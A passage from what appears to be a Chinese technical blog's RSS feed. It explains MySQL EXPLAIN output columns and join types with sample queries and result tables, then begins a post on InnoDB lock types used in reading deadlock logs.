&lt;td&gt;key_len&lt;/td&gt;
&lt;td&gt;key_length&lt;/td&gt;
&lt;td&gt;MySQL决定使用的键长度。如果键是NULL，长度为NULL&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;ref&lt;/td&gt;
&lt;td&gt;ref&lt;/td&gt;
&lt;td&gt;与索引关联的列&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;rows&lt;/td&gt;
&lt;td&gt;rows&lt;/td&gt;
&lt;td&gt;mysql认为执行sql时必须被校验的行数&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;filtered&lt;/td&gt;
&lt;td&gt;filtered&lt;/td&gt;
&lt;td&gt;表示此查询条件所过滤的数据的百分比&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;Extra&lt;/td&gt;
&lt;td&gt;None&lt;/td&gt;
&lt;td&gt;附加信息&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&#34;2-1-id&#34;&gt;2.1 id&lt;/h3&gt;

&lt;p&gt;SELECT标识符。SELECT在查询中的序列号，可以为空。&lt;/p&gt;

&lt;h3 id=&#34;2-2-select-type&#34;&gt;2.2 select_type&lt;/h3&gt;

&lt;p&gt;SELECT类型，所有类型在下表中展示，JSON格式的EXPLAIN将SELECT类型公开为query_block的属性，除非它是SIMPLE或PRIMARY。 JSON名称(不适用为None)也显示在表中。&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;select_type Value&lt;/th&gt;
&lt;th&gt;JSON Name&lt;/th&gt;
&lt;th&gt;Meaning&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;SIMPLE&lt;/td&gt;
&lt;td&gt;None&lt;/td&gt;
&lt;td&gt;简单SELECT(不使用UNION或子查询等)&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;PRIMARY&lt;/td&gt;
&lt;td&gt;None&lt;/td&gt;
&lt;td&gt;嵌套查询时最外层的查询&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;UNION&lt;/td&gt;
&lt;td&gt;None&lt;/td&gt;
&lt;td&gt;UNION中的第二个或后面的SELECT语句&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;DEPENDENT UNION&lt;/td&gt;
&lt;td&gt;dependent (true)&lt;/td&gt;
&lt;td&gt;UNION中的第二个或以后的SELECT语句，取决于外部查询&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;UNION RESULT&lt;/td&gt;
&lt;td&gt;union_result&lt;/td&gt;
&lt;td&gt;UNION的结果&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;SUBQUERY&lt;/td&gt;
&lt;td&gt;None&lt;/td&gt;
&lt;td&gt;子查询中的第一个选择&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;DEPENDENT SUBQUERY&lt;/td&gt;
&lt;td&gt;dependent (true)&lt;/td&gt;
&lt;td&gt;子查询中的第一个选择，取决于外部查询&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;DERIVED&lt;/td&gt;
&lt;td&gt;None&lt;/td&gt;
&lt;td&gt;派生表（子查询中产生的临时表）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;MATERIALIZED&lt;/td&gt;
&lt;td&gt;materialized_from_subquery&lt;/td&gt;
&lt;td&gt;物化子查询&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;UNCACHEABLE SUBQUERY&lt;/td&gt;
&lt;td&gt;cacheable (false)&lt;/td&gt;
&lt;td&gt;无法缓存结果的子查询，必须对外部查询的每一行进行重新计算&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;UNCACHEABLE UNION&lt;/td&gt;
&lt;td&gt;cacheable (false)&lt;/td&gt;
&lt;td&gt;UNION中属于不可缓存子查询的第二个或以后的选择(请参 UNCACHEABLE SUBQUERY)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;SIMPLE：简单SELECT(不使用UNION或子查询等)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; explain select * from t_a where id =1;
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+
| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra |
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+
|  1 | SIMPLE      | t_a   | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL  |
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+
1 row in set, 1 warning (0.03 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;PRIMARY：嵌套查询时最外层的查询&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; explain select * from t_a where num &amp;gt;(select num from t_a where id = 3);
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+
| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra                    |
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+
|  1 | PRIMARY     | t_a   | NULL       | range | num_key       | num_key | 5       | NULL  |    6 |   100.00 | Using where; Using index |
|  2 | SUBQUERY    | t_a   | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL                     |
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+
2 rows in set, 1 warning (0.03 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;UNION：UNION中的第二个或后面的SELECT语句&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; explain select * from t_a where id =9 union all select * from t_a;
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------------+
| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra       |
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------------+
|  1 | PRIMARY     | t_a   | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL        |
|  2 | UNION       | t_a   | NULL       | index | NULL          | num_key | 5       | NULL  |    9 |   100.00 | Using index |
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------------+
2 rows in set, 1 warning (0.04 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;DEPENDENT UNION：UNION中的第二个或以后的SELECT语句，取决于外部查询&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; explain select * from t_a where id in (select id from t_a where id &amp;gt;8 union all select id from t_a where id =5);
+----+--------------------+-------+------------+--------+---------------+---------+---------+-------+------+----------+--------------------------+
| id | select_type        | table | partitions | type   | possible_keys | key     | key_len | ref   | rows | filtered | Extra                    |
+----+--------------------+-------+------------+--------+---------------+---------+---------+-------+------+----------+--------------------------+
|  1 | PRIMARY            | t_a   | NULL       | index  | NULL          | num_key | 5       | NULL  |    9 |   100.00 | Using where; Using index |
|  2 | DEPENDENT SUBQUERY | t_a   | NULL       | eq_ref | PRIMARY       | PRIMARY | 8       | func  |    1 |   100.00 | Using where; Using index |
|  3 | DEPENDENT UNION    | t_a   | NULL       | const  | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | Using index              |
+----+--------------------+-------+------------+--------+---------------+---------+---------+-------+------+----------+--------------------------+
3 rows in set, 1 warning (0.08 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;UNION RESULT：UNION的结果&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; explain select num from t_a where id = 3 union select num from t_a where id =4;
+----+--------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+-----------------+
| id | select_type  | table      | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra           |
+----+--------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+-----------------+
|  1 | PRIMARY      | t_a        | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL            |
|  2 | UNION        | t_a        | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL            |
| NULL | UNION RESULT | &amp;lt;union1,2&amp;gt; | NULL       | ALL   | NULL          | NULL    | NULL    | NULL  | NULL |     NULL | Using temporary |
+----+--------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+-----------------+
3 rows in set, 1 warning (0.03 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;SUBQUERY：子查询中的第一个选择&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; explain select * from t_a where num &amp;gt;(select num from t_a where id = 3);
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+
| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra                    |
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+
|  1 | PRIMARY     | t_a   | NULL       | range | num_key       | num_key | 5       | NULL  |    6 |   100.00 | Using where; Using index |
|  2 | SUBQUERY    | t_a   | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL                     |
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+
2 rows in set, 1 warning (0.03 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;DEPENDENT SUBQUERY：子查询中的第一个选择，取决于外部查询&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; explain select * from t_a where num in(select num from t_a where id = 3 union select num from t_a where id =4);
+----+--------------------+------------+------------+-------+-----------------+---------+---------+-------+------+----------+--------------------------+
| id | select_type        | table      | partitions | type  | possible_keys   | key     | key_len | ref   | rows | filtered | Extra                    |
+----+--------------------+------------+------------+-------+-----------------+---------+---------+-------+------+----------+--------------------------+
|  1 | PRIMARY            | t_a        | NULL       | index | NULL            | num_key | 5       | NULL  |    9 |   100.00 | Using where; Using index |
|  2 | DEPENDENT SUBQUERY | t_a        | NULL       | const | PRIMARY,num_key | PRIMARY | 8       | const |    1 |   100.00 | NULL                     |
|  3 | DEPENDENT UNION    | t_a        | NULL       | const | PRIMARY,num_key | PRIMARY | 8       | const |    1 |   100.00 | NULL                     |
| NULL | UNION RESULT       | &amp;lt;union2,3&amp;gt; | NULL       | ALL   | NULL            | NULL    | NULL    | NULL  | NULL |     NULL | Using temporary          |
+----+--------------------+------------+------------+-------+-----------------+---------+---------+-------+------+----------+--------------------------+
4 rows in set, 1 warning (0.12 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;DERIVED：派生表（子查询中产生的临时表）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; explain select a.id from (select id from t_a where id &amp;gt;8 union all select id from t_a where id =5) a;
+----+-------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+
| id | select_type | table      | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra                    |
+----+-------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+
|  1 | PRIMARY     | &amp;lt;derived2&amp;gt; | NULL       | ALL   | NULL          | NULL    | NULL    | NULL  |    3 |   100.00 | NULL                     |
|  2 | DERIVED     | t_a        | NULL       | range | PRIMARY       | PRIMARY | 8       | NULL  |    1 |   100.00 | Using where; Using index |
|  3 | UNION       | t_a        | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | Using index              |
+----+-------------+------------+------------+-------+---------------+---------+---------+-------+------+----------+--------------------------+
3 rows in set, 1 warning (0.12 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;2-3-table&#34;&gt;2.3 table&lt;/h3&gt;

&lt;p&gt;显示这一行的数据是关于哪张表的，&lt;font color=red&gt;有时是真实的表名字，有时也可能是以下几种结果&lt;/font&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&amp;lt;unionM,N&amp;gt;: 指id为M,N行结果的并集&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&amp;lt;derivedN&amp;gt;: 该行是指id值为n的行的派生表结果。派生表可能来自例如from子句中的子查询。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&amp;lt;subqueryN&amp;gt;: 该行是指id值为n的行的物化子查询的结果。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;2-4-partitions&#34;&gt;2.4 partitions&lt;/h3&gt;

&lt;p&gt;查询的记录所属于的分区，对于未分区表，该值为NULL。&lt;/p&gt;

&lt;h3 id=&#34;2-5-type&#34;&gt;2.5 type&lt;/h3&gt;

&lt;p&gt;连接使用了哪种类别,有无使用索引,常用的类型有：&lt;font color=red&gt; system,  const, eq_ref, ref, range, index, ALL（从左到右，性能越来越差）&lt;/font&gt;，详情查看&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/explain-output.html#explain-join-types&#34;&gt; EXPLAIN Join Types&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;NULL：MySQL在优化过程中分解语句，执行时甚至不用访问表或索引，例如从一个索引列里选取最小值可以通过单独索引查找完成&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;system：这个表（也可能是查询出来的临时表）只有一行数据 (= system table). 是const中的一个特例&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;const：表最多有一个匹配行，它将在查询开始时被读取。因为仅有一行，在这行的列值可被优化器剩余部分认为是常数。const表很快，因为它们只读取一次！const用于查询条件为PRIMARY KEY或UNIQUE索引并与常数值进行比较时的所有部分。&lt;/br&gt;
在下面的查询中，tbl_name可以用于const表：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT * from tbl_name WHERE primary_key=1；
SELECT * from tbl_name WHERE primary_key_part1=1和 primary_key_part2=2；

--例子
mysql&amp;gt; explain select * from t_a where id =1;
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+
| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra |
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+
|  1 | SIMPLE      | t_a   | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL  |
+----+-------------+-------+------------+-------+---------------+---------+---------+-------+------+----------+-------+
1 row in set, 1 warning (0.07 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;eq_ref：对于前几个表中的每一行组合，从该表中读取一行。除了system和const，这是最好的连接类型。当连接使用索引的所有部分，并且索引是主键或唯一非空索引时，将使用它。eq_ref可以用于使用= 操作符比较的带索引的列。比较值可以为常量或一个使用在该表前面所读取的表的列的表达式。&lt;/br&gt;
在下面的例子中，MySQL可以使用eq_ref联接去处理ref_tables：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT * FROM ref_table,other_table
  WHERE ref_table.key_column=other_table.column;

SELECT * FROM ref_table,other_table
  WHERE ref_table.key_column_part1=other_table.column
  AND ref_table.key_column_part2=1;

--例子（t_b为t_a的复制表，表结构相同）
mysql&amp;gt; explain select * from t_a,t_b where t_a.code=t_b.code;
+----+-------------+-------+------------+--------+---------------+---------+---------+---------------+------+----------+-------+
| id | select_type | table | partitions | type   | possible_keys | key     | key_len | ref           | rows | filtered | Extra |
+----+-------------+-------+------------+--------+---------------+---------+---------+---------------+------+----------+-------+
|  1 | SIMPLE      | t_a   | NULL       | ALL    | uk_code       | NULL    | NULL    | NULL          |    9 |   100.00 | NULL  |
|  1 | SIMPLE      | t_b   | NULL       | eq_ref | uk_code       | uk_code | 4       | test.t_a.code |    1 |   100.00 | NULL  |
+----+-------------+-------+------------+--------+---------------+---------+---------+---------------+------+----------+-------+
2 rows in set, 1 warning (0.03 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ref对于每个来自于前面的表的行组合，所有有匹配索引值的行将从这张表中读取。如果联接只使用键的最左边的前缀，或如果键不是UNIQUE或PRIMARY KEY（换句话说，如果联接不能基于关键字查询结果为单个行的话），则使用ref。如果使用的键仅仅匹配少量行，该联接类型是不错的。ref可以用于使用=或&amp;lt;=&amp;gt;操作符的带索引的列。&lt;/br&gt;
在下面的例子中，MySQL可以使用ref联接来处理ref_tables：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT * FROM ref_table WHERE key_column=expr;

SELECT * FROM ref_table,other_table
  WHERE ref_table.key_column=other_table.column;

SELECT * FROM ref_table,other_table
  WHERE ref_table.key_column_part1=other_table.column
  AND ref_table.key_column_part2=1;

--例子（t_b为t_a的复制表，表结构相同）
mysql&amp;gt; explain select * from t_a,t_b where t_a.age=t_b.age;
+----+-------------+-------+------------+------+---------------+---------+---------+--------------+------+----------+-------------+
| id | select_type | table | partitions | type | possible_keys | key     | key_len | ref          | rows | filtered | Extra       |
+----+-------------+-------+------------+------+---------------+---------+---------+--------------+------+----------+-------------+
|  1 | SIMPLE      | t_a   | NULL       | ALL  | age_key       | NULL    | NULL    | NULL         |    9 |   100.00 | Using where |
|  1 | SIMPLE      | t_b   | NULL       | ref  | age_key       | age_key | 5       | test.t_a.age |    1 |   100.00 | NULL        |
+----+-------------+-------+------------+------+---------------+---------+---------+--------------+------+----------+-------------+
2 rows in set, 1 warning (0.03 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;fulltext：使用FULLTEXT索引执行连接&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ref_or_null：该联接类型ref类似，但是添加了MySQL可以专门搜索包含NULL值的行。在解决子查询中经常使用该联接类型的优化。&lt;/br&gt;
在下面的例子中，MySQL可以使用ref_or_null联接来处理ref_tables：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT * FROM ref_table
  WHERE key_column=expr OR key_column IS NULL;

--例子
mysql&amp;gt; explain select * from t_a where t_a.age =3 or t_a.age is null;
+----+-------------+-------+------------+-------------+---------------+---------+---------+-------+------+----------+-----------------------+
| id | select_type | table | partitions | type        | possible_keys | key     | key_len | ref   | rows | filtered | Extra                 |
+----+-------------+-------+------------+-------------+---------------+---------+---------+-------+------+----------+-----------------------+
|  1 | SIMPLE      | t_a   | NULL       | ref_or_null | age_key       | age_key | 5       | const |    2 |   100.00 | Using index condition |
+----+-------------+-------+------------+-------------+---------------+---------+---------+-------+------+----------+-----------------------+
1 row in set, 1 warning (0.03 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;index_merge：该联接类型表示使用了索引合并优化方法。在这种情况下，key列包含了使用的索引的清单，key_len包含了使用的索引的最长的关键元素。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT * FROM ref_table
  WHERE idx1=expr1 OR idx2 =expr2;

--例子
mysql&amp;gt; explain select * from t_a where t_a.code =3 or t_a.age = 3;
+----+-------------+-------+------------+-------------+-----------------+-----------------+---------+------+------+----------+-------------------------------------------+
| id | select_type | table | partitions | type        | possible_keys   | key             | key_len | ref  | rows | filtered | Extra                                     |
+----+-------------+-------+------------+-------------+-----------------+-----------------+---------+------+------+----------+-------------------------------------------+
|  1 | SIMPLE      | t_a   | NULL       | index_merge | uk_code,age_key | uk_code,age_key | 4,5     | NULL |    2 |   100.00 | Using union(uk_code,age_key); Using where |
+----+-------------+-------+------------+-------------+-----------------+-----------------+---------+------+------+----------+-------------------------------------------+
1 row in set, 1 warning (0.03 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;unique_subquery：该类型替换了下面形式的IN子查询的ref：&lt;/br&gt;
&lt;code&gt;value IN (SELECT primary_key FROM single_table WHERE some_expr)&lt;/code&gt;&lt;/br&gt;
unique_subquery是一个索引查找函数，可以完全替换子查询，效率更高。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;index_subquery：该联接类型类似于unique_subquery。可以替换IN子查询，但只适合下列形式的子查询中的非唯一索引：
&lt;code&gt;value IN (SELECT key_column FROM single_table WHERE some_expr)&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;range：只检索给定范围的行，使用一个索引来选择行。key列显示使用了哪个索引。key_len包含所使用索引的最长关键元素。在该类型中ref列为NULL。&lt;font color=red&gt;当使用=、&amp;lt;&amp;gt;、&amp;gt;、&amp;gt;=、&amp;lt;、&amp;lt;=、IS NULL、&amp;lt;=&amp;gt;、BETWEEN或者IN操作符，用常量比较关键字列时，可以使用range &lt;/font&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;mysql&amp;gt; explain select * from t_a where id &amp;gt; 8;
+----+-------------+-------+------------+-------+---------------+---------+---------+------+------+----------+-------------+
| id | select_type | table | partitions | type  | possible_keys | key     | key_len | ref  | rows | filtered | Extra       |
+----+-------------+-------+------------+-------+---------------+---------+---------+------+------+----------+-------------+
|  1 | SIMPLE      | t_a   | NULL       | range | PRIMARY       | PRIMARY | 8       | NULL |    1 |   100.00 | Using where |
+----+-------------+-------+------------+-------+---------------+---------+---------+------+------+----------+-------------+
1 row in set, 1 warning (0.03 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;index：该联接类型与ALL相同，除了只有索引树被扫描。这通常比ALL快，因为索引文件通常比数据文件小。当查询只使用作为单索引一部分的列时，MySQL可以使用该联接类型。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ALL：对于每个来自于先前的表的行组合，进行完整的表扫描。如果表是第一个没标记const的表，这通常不好，并且通常在它情况下很差。通常可以增加更多的索引而不要使用ALL，使得行能基于前面的表中的常数值或列值被检索出。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;2-6-possible-keys&#34;&gt;2.6 possible_keys&lt;/h3&gt;

&lt;p&gt;possible_keys列指出MySQL能使用哪个索引在该表中找到行。注意，该列完全独立于EXPLAIN输出所示的表的次序。这意味着在possible_keys中的某些键实际上不能按生成的表次序使用。&lt;/p&gt;

&lt;p&gt;如果该列是NULL，则没有相关的索引。在这种情况下，可以通过检查WHERE子句看是否它引用某些列或适合索引的列来提高你的查询性能。如果是这样，创造一个适当的索引并且再次用EXPLAIN检查查询&lt;/p&gt;

&lt;h3 id=&#34;2-7-key&#34;&gt;2.7 key&lt;/h3&gt;

&lt;p&gt;key列显示MySQL实际决定使用的键（索引）。如果没有选择索引，键是NULL。要想强制MySQL使用或忽视possible_keys列中的索引，在查询中使用FORCE INDEX、USE INDEX或者IGNORE INDEX。&lt;/p&gt;

&lt;h3 id=&#34;2-8-key-len&#34;&gt;2.8 key_len&lt;/h3&gt;

&lt;p&gt;key_len列显示MySQL决定使用的键长度。如果键是NULL，则长度为NULL。
  使用的索引的长度。在不损失精确性的情况下，长度越短越好&lt;/p&gt;

&lt;h3 id=&#34;2-9-ref&#34;&gt;2.9 ref&lt;/h3&gt;

&lt;p&gt;ref列显示使用哪个列或常数与key一起从表中选择行。&lt;/p&gt;

&lt;h3 id=&#34;2-10-rows&#34;&gt;2.10 rows&lt;/h3&gt;

&lt;p&gt;rows列显示MySQL认为它执行查询时必须检查的行数。&lt;/p&gt;

&lt;h3 id=&#34;2-11-extra&#34;&gt;2.11 Extra&lt;/h3&gt;

&lt;p&gt;该列包含MySQL解决查询的详细信息,下面详细.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Distinct：一旦MYSQL找到了与行相联合匹配的行，就不再搜索了&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Not exists：MYSQL优化了LEFT JOIN，一旦它找到了匹配LEFT JOIN标准的行，就不再搜索了&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Range checked for each：没有找到理想的索引，因此对于从前面表中来的每一个行组合，MYSQL检查使用哪个索引，并用它来从表中返回行。这是使用索引的最慢的连接之一&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Using filesort：看到这个的时候，查询就需要优化了。MYSQL需要进行额外的步骤来发现如何对返回的行排序。它根据连接类型以及存储排序键值和匹配条件的全部行的行指针来排序全部行&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Using index：列数据是从仅仅使用了索引中的信息而没有读取实际的行动的表返回的，这发生在对表的全部的请求列都是同一个索引的部分的时候&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Using temporary：看到这个的时候，查询需要优化了。这里，MYSQL需要创建一个临时表来存储结果，这通常发生在对不同的列集进行ORDER BY上，而不是GROUP BY上&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Using where：使用了WHERE从句来限制哪些行将与下一张表匹配或者是返回给用户。如果不想返回表中的全部行，并且连接类型ALL或index，这就会发生，或者是查询有问题&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;参考：
1. &lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/explain-output.html&#34;&gt;MySQL5.7 EXPLAIN Output Format&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>死锁-了解MySQL死锁日志</title>
      <link>https://wangzitao6.github.io/2018-08-05-%E6%AD%BB%E9%94%81%E6%97%A5%E5%BF%97</link>
      <pubDate>Sun, 05 Aug 2018 13:36:46 +0800</pubDate>
      
      <guid>https://wangzitao6.github.io/2018-08-05-%E6%AD%BB%E9%94%81%E6%97%A5%E5%BF%97</guid>
      <description>&lt;p&gt;锁的种类&amp;amp;概念&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Shared and Exclusive Locks&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;  1. Shared lock: 共享锁,官方描述：permits the transaction that holds the lock to read a row
  eg：select * from xx where a=1 lock in share mode
  2. Exclusive Locks：排他锁： permits the transaction that holds the lock to update or delete a row
  eg: select * from xx where a=1 for update
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Intention Locks&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;  1. 这个锁是加在table上的，表示要对下一个层级（记录）进行加锁  
  2. Intention shared (IS）：Transaction T intends to set S locks on individual rows in table t  
  3. Intention exclusive (IX):  Transaction T intends to set X locks on those rows  
  4. 在数据库层看到的结果是这样的：
      TABLE LOCK table `lc_3`.`a` trx id 133588125 lock mode IX
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Record Locks&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;  1. 在数据库层看到的结果是这样的：
      RECORD LOCKS space id 281 page no 3 n bits 72 index PRIMARY of table `lc_3`.`a` trx id 133588125 lock_mode X locks rec but not gap
  2. 该锁是加在索引上的（从上面的index PRIMARY of table `lc_3`.`a` 就能看出来）
  3. 记录锁可以有两种类型：lock_mode X locks rec but not gap  &amp;amp;&amp;amp; lock_mode S locks rec but not gap
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Gap Locks&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;  1. 在数据库层看到的结果是这样的：
      RECORD LOCKS space id 281 page no 5 n bits 72 index idx_c of table `lc_3`.`a` trx id 133588125 lock_mode X locks gap before rec  
  2. Gap锁是用来防止insert的  
  3. Gap锁，中文名间隙锁，锁住的不是记录，而是范围,比如：(negative infinity, 10），(10, 11）区间，这里都是开区间哦
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Next-Key Locks&lt;/strong&gt;&lt;/li&gt;
